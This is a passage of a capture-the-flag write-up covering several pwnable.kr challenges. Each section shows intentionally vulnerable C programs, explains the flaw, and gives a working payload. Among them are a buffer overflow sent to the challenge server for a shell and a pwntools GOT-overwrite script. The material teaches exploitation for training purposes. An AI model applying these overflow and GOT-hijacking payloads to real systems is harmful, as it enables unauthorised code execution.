</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>( argv[<span style=color:#ae81ff>1</span>] ) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1234</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        len <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(fd, buf, <span style=color:#ae81ff>32</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>strcmp</span>(<span style=color:#e6db74>&#34;LETMEWIN</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buf)){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;good job :)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/cat flag&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;learn about Linux file IO</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We noticed that if <code>buf == LETMEWIN</code> then the program will start a new subprocess to execute <code>"/bin/cat flag"</code>. We can see the permission of the compiled file <code>fd</code> and <code>flag</code> are</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>-r-sr-x--- <span style=color:#ae81ff>1</span> fd_pwn fd   <span style=color:#ae81ff>7322</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2014</span> fd
</span></span><span style=display:flex><span>-r--r----- <span style=color:#ae81ff>1</span> fd_pwn root   <span style=color:#ae81ff>50</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2014</span> flag
</span></span></code></pre></div><p>This permission tells us that when we run <code>fd</code> as <code>fd</code> users, the <code>euid</code> of the process will be <code>fd_pwn</code>, which is good enough to read <code>flag</code>.</p><p>Now it is quite clear on how to pwn this program.</p><ol><li><code>if(!strcmp("LETMEWIN\n", buf))</code> -> let the string in <code>buf</code> equals to &ldquo;LETMEWIN\n&rdquo;, so that the program can help us read the <code>flag</code></li><li><code>len = read(fd, buf, 32);</code> -> let <code>fd</code> equals to 0 so that we can fill <code>buf</code> via standard input.</li><li><code>int fd = atoi( argv[1] ) - 0x1234;</code> let <code>argv[1]</code> equals 4660 (decimal representation of 0x1234) to make <code>fd</code> 0.</li><li>final payload:</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>echo <span style=color:#e6db74>&#34;LETMEWIN&#34;</span> | ./fd <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#34;print(0x1234)&#34;</span><span style=color:#66d9ef>)</span>
</span></span></code></pre></div><p>ps: echo adds a <code>\n</code> by default.</p><h2 id=collision---3-pt>collision - 3 pt<a hidden class=anchor aria-hidden=true href=#collision---3-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// col.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> hashcode <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x21DD09EC</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>check_password</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> p){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span><span style=color:#f92672>*</span> ip <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span><span style=color:#f92672>*</span>)p;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> res<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>5</span>; i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>                res <span style=color:#f92672>+=</span> ip[i];
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> res;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[]){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(argc<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>2</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;usage : %s [passcode]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>(argv[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>20</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;passcode length should be 20 bytes</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(hashcode <span style=color:#f92672>==</span> <span style=color:#a6e22e>check_password</span>( argv[<span style=color:#ae81ff>1</span>] )){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/cat flag&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;wrong passcode.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>To successfully run the program, we must provide 20 bytes as the first argument. The <code>check_password</code> function takes 20 bytes(the first argument), splits them into five groups of four bytes each, and treats each group as an integer. This gives us five integers in total. If the sum of these five integers equals the pre-defined <code>hashcode</code> value of <code>0x21DD09EC</code>, then the flag will be printed. By performing some calculations, we can determine that the five integers needed to match <code>hashcode</code> are <code>0x6c5cec8</code>,<code>0x6c5cec8</code>,<code>0x6c5cec8</code>,<code>0x6c5cec8</code>,<code>0x6c5cecc</code>. Considering the <code>little endian</code> byte order, we can construct our final payload accordingly.</p><p>final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>echo -en <span style=color:#e6db74>&#34;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&#34;</span> | xargs ./col
</span></span></code></pre></div><h2 id=bof---5-pt>bof - 5 pt<a hidden class=anchor aria-hidden=true href=#bof---5-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// bof.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>func</span>(<span style=color:#66d9ef>int</span> key){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> overflowme[<span style=color:#ae81ff>32</span>];
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;overflow me : &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>gets</span>(overflowme);	<span style=color:#75715e>// smash me!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span>(key <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xcafebabe</span>){
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Nah..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[]){
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>func</span>(<span style=color:#ae81ff>0xdeadbeef</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Classic stack buffer overflow. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. Here we have <code>gets</code>, this function takes unlimited number of characters whereas <code>overflowme array</code> can only hold upto 32 bytes. In general, we can use a bof vulnerability to manipulate the rip or instruction pointer to control the program flow. However, in this case, the solution is simpler. All we need to do is change the <code>key</code> to <code>0xcafebabe</code> to exploit this program. Since <code>key</code> is an argument rather than a local variable, we can overwrite the buffer <code>overflowme</code> from the beginning to the <code>rbp/ebp+8</code> to change its value. It is important to note that <code>system("/bin/sh")</code> is a subprocess that will terminate when the parent process ends. Therefore, we use the cat trick to obtain a persistent shell.</p><p>final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>echo -en <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca&#34;</span>; cat<span style=color:#f92672>)</span> | nc pwnable.kr <span style=color:#ae81ff>9000</span>
</span></span></code></pre></div><h2 id=flag---7-pt>flag - 7 pt<a hidden class=anchor aria-hidden=true href=#flag---7-pt>#</a></h2><p>This <a href=http://pwnable.kr/bin/flag>challenge</a> is a reverse enginnering challenge. The flag is in the binary itself.</p><p>Run <code>file flag</code> to get some basic info about this file</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>flag: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>GNU/Linux<span style=color:#f92672>)</span>, statically linked, no section header
</span></span></code></pre></div><p>An <code>ELF</code> with <code>no section header</code> looks suspecious. Then we run <code>strings flag</code> to see whether there is something interesting inside.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>UPX!
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>$Info: This file is packed with the UPX executable packer http://upx.sf.net $
</span></span><span style=display:flex><span>$Id: UPX 3.08 Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> 1996-2011 the UPX Team. All Rights Reserved. $
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>UPX!
</span></span><span style=display:flex><span>UPX!
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>Boom! It&rsquo;s <a href=https://github.com/upx/upx>UPX</a>. We can unpack it by running <code>upx -d flag</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>                       Ultimate Packer <span style=color:#66d9ef>for</span> eXecutables
</span></span><span style=display:flex><span>                          Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>1996</span> - <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        File size         Ratio      Format      Name
</span></span><span style=display:flex><span>   --------------------   ------   -----------   -----------
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>883745</span> &lt;-    <span style=color:#ae81ff>335288</span>   37.94%   linux/amd64   flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Unpacked <span style=color:#ae81ff>1</span> file.
</span></span></code></pre></div><p>Now put the unpacked file into idapro, understand that all this program do is to copy a string (our flag) to a <code>malloc</code> address. We can use gdb to dynamically check the string stored at that <code>malloc</code> address to get the flag.</p><pre tabindex=0><code>0x0000000000401180 in main ()
1: x/10i $rip
=&gt; 0x401180 &lt;main+28&gt;:  mov    QWORD PTR [rbp-0x8],rax
   0x401184 &lt;main+32&gt;:  mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;
   0x40118b &lt;main+39&gt;:  mov    rax,QWORD PTR [rbp-0x8]
   0x40118f &lt;main+43&gt;:  mov    rsi,rdx
   0x401192 &lt;main+46&gt;:  mov    rdi,rax
   0x401195 &lt;main+49&gt;:  call   0x400320
   0x40119a &lt;main+54&gt;:  mov    eax,0x0
   0x40119f &lt;main+59&gt;:  leave
   0x4011a0 &lt;main+60&gt;:  ret
   0x4011a1:    nop
(gdb) p/x $rax      &lt;- the address that malloc gives us
$2 = 0x6c96b0
...
0x000000000040119a in main ()
1: x/10i $rip
=&gt; 0x40119a &lt;main+54&gt;:  mov    eax,0x0
   0x40119f &lt;main+59&gt;:  leave
   0x4011a0 &lt;main+60&gt;:  ret
   0x4011a1:    nop
   0x4011a2:    nop
   0x4011a3:    nop
   0x4011a4:    nop
   0x4011a5:    nop
   0x4011a6:    nop
   0x4011a7:    nop
(gdb) x/s 0x6c96b0     &lt;- check what&#39;s in this address
0x6c96b0:       &#34;UPX...? sounds like a delivery service :)&#34;
</code></pre><h2 id=passcode---10-pt>passcode - 10 pt<a hidden class=anchor aria-hidden=true href=#passcode---10-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// passcode.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>login</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> passcode1;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> passcode2;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;enter passcode1 : &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, passcode1);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fflush</span>(stdin);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;enter passcode2 : &#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, passcode2);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;checking...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(passcode1<span style=color:#f92672>==</span><span style=color:#ae81ff>338150</span> <span style=color:#f92672>&amp;&amp;</span> passcode2<span style=color:#f92672>==</span><span style=color:#ae81ff>13371337</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Login OK!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/cat flag&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Login Failed!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>welcome</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> name[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;enter you name : &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%100s&#34;</span>, name);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Welcome %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, name);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>welcome</span>();
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>login</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// something after login...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now I can safely trust you that you have credential :)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Upon auditing the code, we can find that the problem is <code>scanf("%d", passcode1)</code> (as well as <code>scanf("%d", passcode2)</code>). The intended behavior is to use <code>scanf("%d", &amp;passcode1)</code> instead. In the current code, the value of <code>passcode1</code> is being interpreted as an address, and the input from standard input is being saved to the address stored in <code>passcode1</code>. As <code>passcode1</code> is not initialized, its value will be whatever is on the stack, which in most cases will be a polluted value. In this challenge, we can take advantage of the <code>name</code> array in the <code>welcome</code> function to pollute this value. By checking the assembly code of the <em>ELF</em> we can see that <code>name</code> starts at <code>ebp-0x70</code> and the address of <code>password1</code> is <code>ebp-0x10</code>. We can input 96 bytes as padding and 4 bytes as the value of <code>passcode1</code>, which will be the address to have our next input by <code>scanf("%d", passcode1)</code></p><p>Now we have the ability to write data to arbitary address, what address is the most interesting one? Here we decide to hijack GOT table.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>readelf -a passcode
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>0804a004  <span style=color:#ae81ff>00000207</span> R_386_JUMP_SLOT   <span style=color:#ae81ff>00000000</span>   fflush@GLIBC_2.0
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>objdump -d -M intel passcode
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>80485e3:	c7 <span style=color:#ae81ff>04</span> <span style=color:#ae81ff>24</span> af <span style=color:#ae81ff>87</span> <span style=color:#ae81ff>04</span> <span style=color:#ae81ff>08</span> 	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x80487af
</span></span><span style=display:flex><span>80485ea:	e8 <span style=color:#ae81ff>71</span> fe ff ff       	call   <span style=color:#ae81ff>8048460</span> &lt;system@plt&gt;
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>We overwrite <code>0x080485e3</code> to <code>0x0804a004</code> to trick the program so that when the program calls <code>fflush()</code>, it actually runs <code>system("/bin/cat flag")</code></p><p>final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># payload for passcode</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;/home/passcode/passcode&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>96</span>
</span></span><span style=display:flex><span>addr <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0x0804a004</span>)
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> bytes(int(<span style=color:#e6db74>&#39;0x080485e3&#39;</span>, base<span style=color:#f92672>=</span><span style=color:#ae81ff>16</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> padding <span style=color:#f92672>+</span> addr <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> target <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>There are something we need to pay attention to when we hijack GOT table.</p><ol><li>The reason why we can make use of <code>0x0804a004</code> and <code>0x080485e3</code> is because this program compiles with <code>NO PIE</code>, otherwise these address will be relative offsets and we can&rsquo;t use them directly.</li><li>We can only hijack GOT table when the security settings is <code>Partial RELRO</code>. If it is set to <code>Full RELRO</code> we won&rsquo;t have write permission to hijack GOT table.</li><li>By hijacking the GOT table, we can make the program <strong>BELIEVE</strong> that <code>system("/bin/cat flag")</code> <strong>IS</strong> <code>fflush()</code>. However, this challenge is tailored to take advantage of <code>fflush</code>. In a real-world program, <code>fflush</code> may be used somewhere else and play a critical role in the program. When we hijack the GOT table, we are likely to crash the program before it reaches the point where we hope to use the hijacked functions. In this case we cannot use this trick.</li><li><code>scanf("%d", passcode1)</code> requires we input an integer as an address, hence we cannot input something like <code>0x080485e3</code>. Instead, we need to convert it to decimal (that&rsquo;s why we have <code>bytes(int())</code> in the payload) to get the correct result.</li></ol><p>Another thing I learned from this challenge is the difference between PIE and ASLR. I consulted with <a href=https://github.com/robwaz>robwaz</a>. Here is his perfect explanation.</p><pre tabindex=0><code>This is a common misunderstanding.
PIE != ASLR
PIE randomizes the location the binary is loaded into memory.  This impacts the code location, which you have observed is constant.
ASLR randomizes other memory mapped into the binary at runtime, such as the stack, heap, etc.

They serve a very similar purpose, but they are in fact two different mechanism.

PIE is something that is determined at compile time.  The binary must be compiled to be a position independent executable.  This means the addresses referenced inside the assembly of the binary are all relative.  Which allows the binary to be ran while loaded at different location offsets.

ASLR is something done at run time when memory is mapped.  It randomizes part of the memory addresses.  This can be done to any binary with no impact, as a binary references the stack, heap, etc based on values it observes while running (or relatively).
</code></pre><h2 id=random---1-pt>random - 1 pt<a hidden class=anchor aria-hidden=true href=#random---1-pt>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// random.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> random;
</span></span><span style=display:flex><span>        random <span style=color:#f92672>=</span> <span style=color:#a6e22e>rand</span>();        <span style=color:#75715e>// random value!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>key);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>( (key <span style=color:#f92672>^</span> random) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xdeadbeef</span> ){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Good!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/cat flag&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Wrong, maybe you should try 2^32 cases.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The problem is it is using <code>rand()</code> without <code>srand()</code> which fails to give <code>rand()</code> a random seed. This leads to <code>rand()</code> is using a default value 1 and lost its randomness and became predictable.</p><p>final payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>// payload.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
